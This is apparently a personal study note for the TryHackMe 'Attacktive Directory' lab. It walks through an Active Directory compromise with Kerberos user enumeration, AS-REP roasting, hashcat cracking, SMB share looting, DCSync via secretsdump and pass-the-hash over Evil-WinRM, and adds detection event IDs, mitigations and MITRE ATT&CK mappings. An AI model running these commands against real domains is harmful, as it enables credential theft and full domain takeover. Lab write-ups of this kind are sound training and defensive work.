# 📚 Resources / Notes — Attacktive Directory (TryHackMe)

> **Personal penetration testing notes and Active Directory methodology reference** for the **Attacktive Directory** TryHackMe room. This document summarizes reconnaissance, Kerberos attacks, SMB enumeration, credential access, privilege escalation, defensive concepts, and MITRE ATT&CK mappings without exposing challenge flags.

---

# 🎯 Purpose

This document serves as a compact field notebook accompanying the complete walkthrough.

It focuses on:

* Active Directory attack methodology.
* Kerberos authentication abuse.
* Enumeration commands.
* Credential attack workflow.
* Detection engineering notes.
* Blue Team mitigation strategies.
* Important penetration testing observations.

Unlike the full documentation, these notes are designed for **quick revision during CTF practice or interview preparation**.

---

# 🧠 Learning Objectives

After completing this room, you should understand:

* Windows Active Directory fundamentals.
* Kerberos authentication workflow.
* Username enumeration via Kerberos.
* AS-REP Roasting attack mechanics.
* SMB authentication and share enumeration.
* Offline password cracking workflow.
* Base64 credential recovery.
* DCSync / NTDS extraction.
* Pass-the-Hash authentication.
* Evil-WinRM remote administration.

---

# 🏗️ Active Directory Overview

## Target Environment

| Property         | Notes                            |
| ---------------- | -------------------------------- |
| Operating System | Windows Server Domain Controller |
| Environment      | Active Directory                 |
| Domain           | `spookysec.local`                |
| Primary Service  | Kerberos + LDAP                  |
| Goal             | Compromise Domain Administrator  |

---

## Important Active Directory Services

| Port | Service                  | Purpose                  |
| ---- | ------------------------ | ------------------------ |
| 53   | DNS                      | Domain resolution        |
| 80   | IIS                      | Web server               |
| 88   | Kerberos                 | Authentication           |
| 135  | RPC                      | Windows RPC              |
| 139  | NetBIOS                  | SMB legacy communication |
| 389  | LDAP                     | Directory Services       |
| 445  | SMB                      | File Shares              |
| 464  | Kerberos Password Change | Password operations      |
| 636  | LDAPS                    | Secure LDAP              |
| 3268 | Global Catalog LDAP      | Forest-wide queries      |
| 3389 | RDP                      | Remote Desktop           |
| 5985 | WinRM                    | Remote PowerShell        |

---

# ⚔️ Attack Chain Summary

```text
Reconnaissance
      │
      ▼
Domain Discovery
      │
      ▼
Kerberos Username Enumeration
      │
      ▼
AS-REP Roasting
      │
      ▼
Offline Password Cracking
      │
      ▼
Authenticated SMB Enumeration
      │
      ▼
Backup Credential Discovery
      │
      ▼
NTDS Extraction (DCSync)
      │
      ▼
Administrator NTLM Hash
      │
      ▼
Pass-the-Hash via WinRM
      │
      ▼
Domain Administrator Access
```

---

# Phase 1 — Reconnaissance Notes

## Nmap Enumeration

Purpose:

* Discover exposed services.
* Identify Windows Server.
* Detect Active Directory.
* Enumerate Kerberos and LDAP.

### Command

```bash
nmap -Pn -A -p- -T4 <TARGET-IP>
```

### Important Findings

* LDAP reveals AD domain.
* Kerberos indicates Domain Controller.
* SMB signing enabled.
* WinRM exposed for lateral movement.

---

## Enumeration Checklist

* [x] Host alive
* [x] Windows Server identified
* [x] LDAP available
* [x] Kerberos available
* [x] SMB available
* [x] WinRM available

---

# Phase 2 — Domain Enumeration

## CrackMapExec / NetExec

Purpose:

Identify:

* Domain Name
* Hostname
* SMB Signing
* SMB Version

### Command

```bash
crackmapexec smb <TARGET-IP>
```

### Key Observation

```
Domain: spookysec.local
Host: ATTACKTIVEDIREC
Signing: True
SMBv1: Disabled
```

### Security Notes

SMB signing prevents SMB relay attacks but **does not prevent authenticated enumeration**.

---

# Phase 3 — Kerberos Username Enumeration

## Kerbrute

Purpose:

Validate usernames without credentials.

### Command

```bash
kerbrute userenum \
-d spookysec.local \
--dc <TARGET-IP> users.txt
```

### Why This Works

Kerberos responses differ between:

* Existing users.
* Invalid users.

### Valid User Examples

* Administrator
* svc-admin
* backup
* robin
* paradox
* james
* ori
* darkstar

---

## Detection Notes

Blue Team Indicators:

* Multiple AS-REQ requests.
* Kerberos Event IDs.
* High authentication failures.

**MITRE ATT&CK**

* T1589 — Gather Victim Identity Information.

---

# Phase 4 — AS-REP Roasting

## Concept

Accounts with **Kerberos preauthentication disabled** allow attackers to request encrypted authentication material without knowing the password.

### Workflow

1. Discover valid usernames.
2. Request AS-REP ticket.
3. Save hash.
4. Crack offline.

---

### Tool

Impacket `GetNPUsers.py`

### Command

```bash
GetNPUsers.py \
spookysec.local/ \
-usersfile valid_users.txt \
-request
```

---

## Output Notes

Result:

* One roastable account discovered.
* AS-REP hash exported.

Sensitive hashes should **never be published** in public repositories.

Replace with:

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<REDACTED_HASH>
```

---

## Why Preauthentication Matters

Preauthentication proves identity before issuing a TGT.

Without it:

* Authentication becomes offline.
* Password guessing leaves fewer server logs.

---

## MITRE ATT&CK

| Technique       | ID        |
| --------------- | --------- |
| AS-REP Roasting | T1558.004 |

---

# Phase 5 — Offline Password Cracking

## Tool

Hashcat

### Mode

```
18200
```

### Command

```bash
hashcat \
-m 18200 hash.txt passwords.txt
```

---

## Notes

* Dictionary attack.
* Offline attack.
* No interaction with Domain Controller.

---

## Password Security Lessons

Weak passwords enable:

* Credential compromise.
* Lateral movement.
* Privilege escalation.

---

## Blue Team Mitigation

* Long passwords.
* Fine-Grained Password Policies.
* Password rotation.
* MFA.

---

# Phase 6 — SMB Enumeration

## Enumerating Shares

Purpose:

Discover accessible shares using compromised credentials.

### Command

```bash
netexec smb <TARGET-IP> \
-u svc-admin \
-p '<PASSWORD>' \
--shares
```

---

### Shares Observed

| Share    | Purpose        |
| -------- | -------------- |
| ADMIN$   | Administrative |
| IPC$     | Named Pipes    |
| NETLOGON | Login Scripts  |
| SYSVOL   | Group Policies |
| backup   | Backup Storage |

---

## Interesting Share

```
backup
```

Reason:

Contained credential backup.

---

## SMBClient

### Connect

```bash
smbclient //<TARGET-IP>/backup
```

### Download File

```bash
get backup_credentials.txt
```

---

## Enumeration Checklist

* [x] List shares.
* [x] Read permissions.
* [x] Download sensitive files.
* [x] Inspect configuration.

---

# Phase 7 — Credential Discovery

## Base64 Recovery

Recovered file contained encoded credentials.

### Decode

CyberChef

or

```bash
echo "<BASE64>" | base64 -d
```

---

## Security Observation

Configuration backups frequently contain:

* Credentials.
* Tokens.
* Passwords.
* API Keys.

---

## Blue Team Mitigation

* Remove plaintext credentials.
* Encrypt backups.
* Rotate credentials.
* Least privilege storage.

---

# Phase 8 — Backup Account Analysis

## Why Backup Is Dangerous

Backup account possessed replication privileges.

Important permissions:

* Replicating Directory Changes.
* Replicating Directory Changes All.

These permissions effectively enable DCSync.

---

## Active Directory Permission Notes

Accounts with replication rights can retrieve password hashes from Domain Controllers.

This does **not** require interactive Administrator login.

---

## MITRE ATT&CK

| Technique | ID        |
| --------- | --------- |
| DCSync    | T1003.006 |

---

# Phase 9 — NTDS Extraction

## Tool

Impacket SecretsDump

### Command

```bash
secretsdump.py \
spookysec.local/backup:<PASSWORD>@<TARGET-IP>
```

---

## Output

Recovered:

* NTLM hashes.
* Kerberos AES Keys.
* Domain account hashes.

**Public repositories should redact these values.**

Example:

```text
Administrator:500:<LM_HASH>:<REDACTED_NTLM_HASH>
```

---

## Why DCSync Works

The tool emulates a Domain Controller requesting replication.

---

## Detection Notes

Monitor:

* Event ID 4662.
* Replication requests.
* Directory replication anomalies.

---

# Phase 10 — Pass-the-Hash

## Concept

Authenticate using NTLM hash instead of plaintext password.

### Tool

Evil-WinRM

### Command

```bash
evil-winrm \
-i <TARGET-IP> \
-u Administrator \
-H <NTLM_HASH>
```

---

## Result

Administrative PowerShell session established.

---

## Why WinRM?

* Remote administration protocol.
* PowerShell Remoting.
* Frequently enabled in enterprise environments.

---

## MITRE ATT&CK

| Technique     | ID        |
| ------------- | --------- |
| Pass-the-Hash | T1550.002 |

---

# Phase 11 — Post Exploitation Notes

## Initial Enumeration

Useful commands:

```powershell
whoami
hostname
systeminfo
ipconfig
whoami /groups
whoami /priv
```

---

## User Enumeration

```powershell
net users
net localgroup administrators
```

---

## Flag Locations

Flags were obtained from multiple user desktops.

For plagiarism safety, values are intentionally hidden.

```text
User Flag       : THM{************************}
PrivEsc Flag    : THM{************************}
Root Flag       : THM{************************}
```

---

# Active Directory Concepts Learned

## Kerberos Authentication Flow

1. Client requests AS.
2. KDC validates preauthentication.
3. TGT issued.
4. TGS requested.
5. Service Ticket generated.

---

## LDAP

Used for:

* Directory objects.
* User discovery.
* Groups.
* Organizational Units.

---

## SYSVOL

Contains:

* Login scripts.
* Group Policies.
* Domain configuration.

---

## NETLOGON

Contains:

* Startup scripts.
* Logon scripts.
* Authentication resources.

---

# Detection Engineering Notes

## Useful Windows Event IDs

| Event ID | Description                     |
| -------- | ------------------------------- |
| 4768     | Kerberos TGT Request            |
| 4769     | Kerberos Service Ticket         |
| 4771     | Kerberos Authentication Failure |
| 4624     | Successful Logon                |
| 4625     | Failed Logon                    |
| 4662     | DCSync / Directory Replication  |
| 4672     | Privileged Logon                |
| 4688     | Process Creation                |
| 5140     | SMB Share Access                |

---

## Sigma Rule Ideas

Detect:

* AS-REP requests without preauthentication.
* Multiple Kerberos username attempts.
* SecretsDump execution.
* WinRM Administrator authentication.
* DCSync replication.

---

# MITRE ATT&CK Mapping

| Phase                | Technique |
| -------------------- | --------- |
| Discovery            | T1087     |
| Network Discovery    | T1018     |
| Kerberos Enumeration | T1589     |
| AS-REP Roasting      | T1558.004 |
| Password Cracking    | T1110.002 |
| SMB Share Discovery  | T1021.002 |
| Credential Dumping   | T1003.006 |
| Pass-the-Hash        | T1550.002 |
| Remote Services      | T1021     |

---

# Common Tools Cheat Sheet

## Recon

```bash
nmap
crackmapexec
netexec
```

## Kerberos

```bash
kerbrute
GetNPUsers.py
```

## SMB

```bash
smbclient
netexec --shares
```

## Cracking

```bash
hashcat
john
```

## Credential Access

```bash
secretsdump.py
lookupsid.py
```

## Remote Access

```bash
evil-winrm
wmiexec.py
psexec.py
```

---

# Lessons Learned

## Red Team Perspective

* Kerberos misconfigurations expose credentials.
* Weak passwords enable offline attacks.
* Backup accounts can become Domain Admin.
* Replication permissions are highly sensitive.

## Blue Team Perspective

* Enable Kerberos preauthentication for all users.
* Audit replication permissions regularly.
* Restrict WinRM access.
* Rotate privileged credentials.
* Monitor Kerberos authentication anomalies.
* Detect DCSync activity.

---

# Quick Revision Checklist

## Enumeration

* [x] Nmap
* [x] SMB Domain Discovery
* [x] Kerberos User Enumeration

## Credential Access

* [x] AS-REP Roast
* [x] Hashcat Crack
* [x] SMB Credential Discovery

## Privilege Escalation

* [x] Backup Account
* [x] DCSync
* [x] NTDS Extraction
* [x] Pass-the-Hash

## Post Exploitation

* [x] WinRM Access
* [x] User Enumeration
* [x] Administrative Shell

---

# References Used During Practice

## Official Documentation

* Microsoft Active Directory Documentation
* Microsoft Kerberos Authentication Documentation
* Impacket Documentation
* Hashcat Wiki
* MITRE ATT&CK Framework

## Educational Resources

* TryHackMe — Attacktive Directory
* Microsoft Learn — Active Directory Security
* SpecterOps — Kerberos Abuse Research
* The Hacker Recipes — Active Directory Attacks

---

# Portfolio Notes

This repository documents a complete Active Directory compromise inside an authorized **TryHackMe** environment.

Sensitive credentials, NTLM hashes, Kerberos tickets, and challenge flags have been **redacted** to keep the repository suitable for public portfolio use while preserving the technical methodology and learning outcomes.

---

<div align="center">

### 🛡️ Active Directory Security • Kerberos Abuse • Detection Engineering • Professional CTF Notes

**Maintained as part of my Cybersecurity Portfolio**

</div>
